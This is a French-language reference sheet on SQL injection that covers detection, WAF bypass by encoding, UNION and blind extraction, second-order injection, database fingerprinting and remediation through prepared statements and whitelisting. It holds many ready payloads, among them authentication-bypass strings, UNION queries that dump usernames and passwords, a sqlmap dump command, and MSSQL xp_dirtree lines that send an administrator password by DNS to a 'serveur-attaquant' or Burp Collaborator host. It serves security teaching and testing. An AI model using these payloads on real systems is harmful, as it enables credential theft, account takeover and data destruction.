---
title: "Injections SQL (SQLi) : Détection, Exploitation et Prévention"
description: "Guide complet sur les injections SQL : détection In-Band/Inline/Blind/OAST, attaques UNION, exfiltration, WAF bypass, fingerprinting et remédiation par requêtes préparées et listes blanches."
tags:
  - sqli
  - web-security
  - red-team
  - blue-team
  - database
  - vulnerability
  - remediation
---

# Injections SQL (SQLi) : Détection, Exploitation et Prévention

!!! note "Objectif de la fiche"
    Ce document couvre l'ensemble du cycle de vie d'une injection SQL : de la détection initiale (in-band, inline, blind, OAST) jusqu'à l'exploitation avancée (UNION, second-order, error-based) et la remédiation applicative. L'approche est volontairement équilibrée entre la posture offensive (Red Team) et la posture défensive (Blue Team).

---

## 1. Détection des Vulnérabilités SQLi

### 1.1 In-Band (Basé sur les erreurs et anomalies)

L'injection du caractère `'` (apostrophe) est le test le plus élémentaire pour casser la syntaxe d'une requête non préparée.

```sql
-- Requête légitime côté serveur
SELECT * FROM produits WHERE nom = 'ENTREE';

-- Après injection d'une simple apostrophe dans le paramètre
-- ENTREE devient : '
SELECT * FROM produits WHERE nom = '''';
```

!!! danger "Signaux de détection"
    - Messages d'erreur verbeux renvoyés par le SGBD, par exemple :
        - `Unclosed quotation mark after the character string...` (SQL Server)
        - `You have an error in your SQL syntax...` (MySQL/MariaDB)
    - Code de statut HTTP anormal : `HTTP 500 Internal Server Error` au lieu du `HTTP 200 OK` attendu.
    - Anomalies comportementales côté rendu : page blanche, éléments manquants, sections tronquées.

### 1.2 Inline (Évaluation d'expressions / calculs serveur)

Sur les entrées strictement numériques, il est possible de confirmer une injection sans casser la syntaxe, en observant si le serveur évalue une expression mathématique.

```text
Paramètre d'origine : id=1

Test 1 (résultat attendu = 1) : id=2-1
Test 2 (résultat attendu = 1) : id=1-0
Test 3 (résultat attendu = 2) : id=1+1
```

!!! tip "Méthode de confirmation"
    Si le rendu visuel change strictement en fonction de l'expression injectée (par exemple l'enregistrement n°2 s'affiche au lieu du n°1), cela confirme que le paramètre est directement évalué par le SGBD, donc vulnérable.

### 1.3 Boolean-Based Blind SQLi (Conditions booléennes)

Technique utilisée lorsque l'application ne renvoie ni erreur SQL ni changement de code de statut, mais que le contenu de la réponse diffère selon la véracité d'une condition injectée.

```sql
-- Test d'une condition VRAIE
' OR 1=1 --

-- Test d'une condition FAUSSE
' OR 1=2 --
```

!!! warning "Points d'observation"
    - Présence ou absence d'un texte caractéristique (ex : `"Welcome Back"`).
    - Différence de taille de la réponse HTTP en octets.
    - Présence ou absence d'une redirection.

    La comparaison systématique entre une condition VRAIE et une condition FAUSSE est indispensable pour éliminer les faux positifs.

### 1.4 Time-Based SQLi (Délais de réponse)

Exploitable lorsque le rendu HTML et le code de statut restent strictement identiques quelle que soit la condition testée. On exploite alors un canal temporel.

```sql
-- MySQL / MariaDB
' AND SLEEP(5) --

-- PostgreSQL
' AND pg_sleep(5) --

-- SQL Server (MSSQL)
' WAITFOR DELAY '0:0:5' --
```

!!! tip "Confirmation"
    Une injection Time-Based est confirmée lorsque le délai de réponse mesuré augmente de manière cohérente avec la valeur injectée (ex : +5 secondes), de façon reproductible sur plusieurs requêtes.

### 1.5 Out-of-Band / OAST (Out-of-band Application Security Testing)

Technique réservée aux contextes où ni le canal de réponse ni le canal temporel ne sont exploitables (architectures asynchrones, API totalement aveugles, traitements par batch). Elle repose sur le déclenchement d'une requête réseau sortante (DNS, HTTP, SMB) vers un serveur d'écoute contrôlé par l'auditeur (type Burp Collaborator).

```sql
-- Oracle (fonctions réseau)
UTL_HTTP
DBMS_LDAP

-- SQL Server (MSSQL) — requête réseau sortante via xp_dirtree
exec master..xp_dirtree '\\serveur-attaquant.com\partage'
```

!!! danger "Confirmation OAST"
    La vulnérabilité est confirmée par la réception effective d'une requête DNS ou HTTP entrante sur le serveur d'écoute, émise depuis l'adresse IP du SGBD cible — preuve irréfutable d'exécution du code SQL injecté côté serveur.

---

## 2. Emplacements, Contextes d'Injection et Contournement

### 2.1 Emplacements dans les requêtes SQL

| Type de requête | Emplacement typique |
|---|---|
| `SELECT` | Clause `WHERE` |
| `UPDATE` | Clause `SET` / `WHERE` |
| `INSERT` | Valeurs insérées |
| `SELECT` (structure) | Noms de tables, noms de colonnes, clause `ORDER BY` |

### 2.2 Contournement de WAF (WAF Bypass) via encodage

!!! warning "Techniques d'évasion"
    Les WAF filtrant sur des motifs textuels bruts (`SELECT`, `UNION`, etc.) peuvent être contournés si la couche applicative décode les données **après** le filtrage.

**Encodage XML / entités hexadécimales :**

```xml
<!-- Décodage XML effectué après le passage du WAF, avant exécution SQL -->
<storeId>999 &#x53;ELECT ...</storeId>
```

**Encodage Unicode JSON :**

```json
{
  "storeId": "999 \u0053ELECT * FROM information_schema.tables"
}
```

### 2.3 En-têtes HTTP enregistrés en base de données

Certaines applications journalisent ou persistent des en-têtes HTTP sans les paramétrer, ouvrant un vecteur d'injection souvent négligé lors des audits classiques.

```http
User-Agent: ' OR 1=1; --
Referer: ' OR 1=1; --
X-Forwarded-For: ' OR 1=1; --
```

---

## 3. Techniques d'Attaque et Cas d'Usage

### 3.1 Exfiltration de données cachées

```sql
-- Neutralisation de la logique métier via commentaire
Gifts'--

-- Neutralisation par tautologie
Gifts' OR 1=1--
```

!!! danger "Avertissement de sécurité"
    Si le même paramètre est réinjecté dans une clause `DELETE`, le risque devient une **destruction massive de données** :

    ```sql
    DELETE FROM products WHERE category = 'Gifts' OR 1=1--
    ```

    Cette requête supprime l'intégralité de la table `products`, et non uniquement la catégorie ciblée.

### 3.2 Subversion de la logique applicative (Bypass d'authentification)

```sql
-- Neutralisation du contrôle du mot de passe
administrator'--
```

!!! note "Variantes selon le SGBD"
    - **MySQL** : un espace est requis après le commentaire double-tiret : `administrator'-- ` (espace final obligatoire).
    - Alternative avec `#` (spécifique MySQL) : `administrator'#`.

**Ciblage du compte admin sans connaître son nom :**

```sql
-- MySQL / PostgreSQL
' OR 1=1 LIMIT 1--

-- MSSQL / Oracle
' OR 1=1--
```

### 3.3 Attaques basées sur UNION (UNION-Based SQLi)

!!! note "Prérequis"
    - Le nombre de colonnes de la requête `UNION SELECT` doit être **identique** à celui de la requête d'origine.
    - Les types de données de chaque colonne doivent être compatibles entre les deux requêtes.

**Étape 1 — Énumération du nombre de colonnes :**

```sql
-- Via ORDER BY (recherche dichotomique jusqu'à erreur)
' ORDER BY 3--

-- Via UNION SELECT NULL (incrémentation progressive)
' UNION SELECT NULL,NULL--
```

!!! tip "Spécificité Oracle"
    Oracle impose la clause `FROM DUAL` pour toute requête `SELECT` sans table source :
    ```sql
    ' UNION SELECT NULL,NULL FROM DUAL--
    ```

**Étape 2 — Identification des colonnes de type `String/Char` :**

```sql
-- Substitution sélective de NULL par une valeur texte
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

**Étape 3 — Exfiltration :**

```sql
-- Exfiltration multi-colonnes
' UNION SELECT username, password FROM users--

-- Exfiltration mono-colonne avec séparateur (concaténation)
' UNION SELECT username || ':' || password FROM users--   -- Oracle/PostgreSQL
' UNION SELECT CONCAT(username,':',password) FROM users-- -- MySQL
```

---

## 4. Techniques d'Exploitation Aveugles (Blind SQLi & Advanced)

### 4.1 Réponses conditionnelles (Boolean-Based)

Le vecteur d'injection n'est pas toujours un paramètre GET/POST visible : les cookies applicatifs sont fréquemment concernés.

```http
Cookie: TrackingId=xyz' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a
```

L'extraction se fait **caractère par caractère**, via `SUBSTRING()` combiné à une recherche dichotomique sur l'espace de caractères possibles.

!!! tip "Automatisation"
    - **Burp Intruder** : modes Cluster Bomb (plusieurs positions) ou Pitchfork (positions synchronisées) pour automatiser le brute-force caractère par caractère.
    - **sqlmap** :
    ```bash
    sqlmap -u "https://site.com" --cookie="TrackingId=xyz" -p TrackingId --level=2 --dump
    ```

### 4.2 Erreurs SQL conditionnelles

Provoquer une erreur SQL (par exemple une division par zéro) **uniquement** lorsque la condition testée est vraie, afin de transformer un Blind SQLi en signal binaire exploitable via le code de statut HTTP.

```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Si la condition `(1=1)` est vraie, l'expression `1/0` déclenche une erreur SQL et donc un `HTTP 500` ; sinon, la requête s'exécute normalement.

### 4.3 Error-Based SQLi

Forcer une conversion de type incompatible (`CAST`) pour faire fuiter une donnée sensible directement dans le message d'erreur retourné par le SGBD.

```sql
' AND CAST((SELECT Password FROM Users WHERE Username='Administrator') AS int)=1--
```

Le SGBD tentera de convertir la chaîne (le mot de passe) en entier, échouera, et retournera généralement la valeur litigieuse dans le message d'erreur.

### 4.4 Exploitation par délais temporels (Time-Based, rappel avancé)

```sql
WAITFOR DELAY '0:0:5'          -- SQL Server
pg_sleep(5)                     -- PostgreSQL
SLEEP(5)                        -- MySQL / MariaDB
dbms_pipe.receive_message(('a'),5) -- Oracle
```

### 4.5 Exploitation Out-Of-Band / OAST — Exfiltration DNS

La donnée exfiltrée est concaténée directement dans le nom de sous-domaine interrogé, permettant sa réception en clair sur le serveur d'écoute DNS.

```sql
-- SQL Server (MSSQL)
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.IDENTIFIANT.burpcollaborator.net/a"')--
```

!!! danger "Portée de l'impact"
    Cette technique fonctionne même sur des architectures totalement aveugles (pas de réponse visible, pas de canal temporel exploitable), ce qui en fait l'une des techniques les plus puissantes en contexte d'audit avancé.

---

## 5. Empreinte et Énumération (Fingerprinting & Enumeration)

### 5.1 Fingerprinting du SGBD

| Critère | MySQL / MariaDB | PostgreSQL | SQL Server | Oracle |
|---|---|---|---|---|
| Commentaire | `#` ou `-- ` | `--` | `--` | `--` |
| Concaténation | `CONCAT()` | `\|\|` | `+` | `\|\|` |
| Table de métadonnées | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` | `all_tables` |
| Version | `version()` | `version()` | `@@version` | `v$version` |

```sql
-- Extraction de version selon le SGBD
SELECT @@version;      -- SQL Server
SELECT version();       -- MySQL / PostgreSQL
SELECT * FROM v$version; -- Oracle
```

### 5.2 Énumération de la base de données

**Étapes standard (via `information_schema`) :**

```sql
-- 1. Lister les tables
' UNION SELECT table_name, NULL FROM information_schema.tables--

-- 2. Lister les colonnes d'une table cible
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--

-- 3. Exfiltrer les données
' UNION SELECT username, password FROM users--
```

!!! note "Spécificités Oracle"
    Oracle n'utilise pas `information_schema` mais ses propres vues de métadonnées : `all_tables`, `all_tab_columns`. Les noms d'objets y sont généralement stockés et retournés en **MAJUSCULES**.

---

## 6. SQLi de Second Ordre (Second-Order SQLi)

!!! warning "Principe"
    Contrairement à une injection classique exploitée immédiatement, le SQLi de second ordre exploite un décalage temporel entre le stockage d'une donnée malveillante et sa réutilisation non sécurisée dans une requête ultérieure.

**Phase 1 — Stockage passif :**

Une donnée malveillante (ex : `admin'--`) est soumise via un formulaire (inscription, changement de nom d'utilisateur, etc.) et **correctement échappée/paramétrée** au moment de l'enregistrement initial. Aucune exploitation n'est visible à ce stade.

**Phase 2 — Exécution active :**

Cette même donnée est **réutilisée ultérieurement** par une fonctionnalité différente, dans une requête construite dynamiquement sans paramétrage :

```sql
-- Exemple : une fonctionnalité de changement de mot de passe
-- réutilise le nom d'utilisateur stocké sans le reparamétrer
UPDATE users SET password = 'hacked123' WHERE username = 'administrator'--'
```

!!! danger "Difficulté de détection"
    Ce type de vulnérabilité échappe aux scanners automatisés classiques, car le point d'injection (formulaire A) et le point d'exécution (fonctionnalité B) sont dissociés dans le temps et dans le code.

---

## 7. Prévention & Remédiation (Blue Team)

### 7.1 Requêtes préparées / Paramétrage (Prepared Statements)

!!! tip "Bonne pratique de référence"
    La séparation stricte entre le code SQL et les données utilisateur, via des espaces réservés (placeholders), est la contre-mesure la plus robuste et la plus universellement recommandée (OWASP).

```sql
-- Requête préparée (exemple générique)
SELECT * FROM produits WHERE nom = ?;
```

Dans ce modèle, la donnée injectée par l'utilisateur ne peut **jamais** être interprétée comme du code SQL, quelle que soit sa valeur.

### 7.2 Gestion des structures dynamiques non paramétrables

!!! warning "Limite des requêtes préparées"
    Les espaces réservés (`?`) ne peuvent pas être utilisés pour :
    - les noms de tables,
    - les noms de colonnes,
    - la direction de tri dans une clause `ORDER BY` (`ASC` / `DESC`).

**Solution recommandée — Liste blanche applicative (Whitelisting) :**

- Définir côté serveur une correspondance stricte entre les identifiants exposés côté client et les structures réelles de la base de données.
- Rejeter toute valeur ne figurant pas explicitement dans cette liste blanche, sans jamais construire dynamiquement la requête à partir de l'entrée brute.

```text
Exemple de cartographie sécurisée :
  Entrée utilisateur "date" -> colonne réelle "created_at"
  Entrée utilisateur "prix" -> colonne réelle "price_cents"
  Toute autre valeur -> rejet (HTTP 400)
```

### 7.3 Synthèse des contre-mesures

| Contre-mesure | Portée |
|---|---|
| Requêtes préparées / ORM paramétré | Toutes les valeurs de données |
| Liste blanche (whitelisting) | Identifiants, noms de colonnes/tables, tri |
| Principe du moindre privilège (compte BDD applicatif) | Limitation de l'impact en cas de contournement |
| Validation stricte des types d'entrée | Défense en profondeur |
| WAF à jour + normalisation avant filtrage | Défense en profondeur (non suffisante seule) |
| Journalisation et alerting sur erreurs SQL anormales | Détection précoce |

!!! danger "Rappel essentiel"
    Aucune de ces contre-mesures n'est suffisante isolément. Les requêtes préparées traitent la cause racine pour les données, mais doivent être complétées par du whitelisting pour les éléments structurels et par une défense en profondeur (moindre privilège, monitoring) pour limiter l'impact en cas de régression.
